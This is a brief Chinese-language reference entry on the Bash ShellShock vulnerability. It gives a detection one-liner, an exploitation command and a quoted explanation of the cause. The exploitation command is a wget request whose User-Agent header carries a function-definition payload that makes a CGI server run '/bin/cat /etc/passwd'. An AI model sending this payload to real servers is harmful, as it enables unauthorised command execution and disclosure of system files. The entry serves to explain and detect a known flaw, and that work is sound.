### [Bash] ShellShock
检测方法：
```
#!bash
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```

利用方法：
```
#!bash
wget -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://10.248.2.15/cgi-bin/testing.cgi
```
漏洞原因：
> Bash supports exporting not just shell variables, but also shell
functions to other bash instances, via the process environment to
(indirect) child processes ... The vulnerability occurs because
bash does not stop after processing the function definition; it
continues to parse and execute shell commands following the function
definition.